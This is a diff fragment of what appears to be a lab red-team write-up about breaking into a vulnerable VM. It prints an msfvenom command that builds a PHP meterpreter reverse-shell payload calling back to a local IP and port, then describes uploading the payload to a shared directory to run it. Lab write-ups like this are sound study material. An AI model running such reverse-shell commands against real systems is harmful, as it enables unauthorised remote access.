@@ -30,6 +30,7 @@ Acted as a red team to attack a vulnerable VM within my environment, ultimately 
     ![ac297f568253612ff55d38fdf157547b](https://user-images.githubusercontent.com/61332852/137390969-4da74fb4-9592-4fd2-9844-2e22bc2a5865.png)
 
 - Getting the login information to the company directory we know can exploit getting into the company system since the server has an open port 80 by creating a reverse shell script. The command being msf venom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > newshell.php
+
 ![b5607ffdbb52b0186be7de39a308e88a](https://user-images.githubusercontent.com/61332852/137391072-15001d7a-24ad-431d-9b67-cf39a58c789e.png)
 
 - Once the reverse shell script is created we can now upload it to the shared directory to run it.
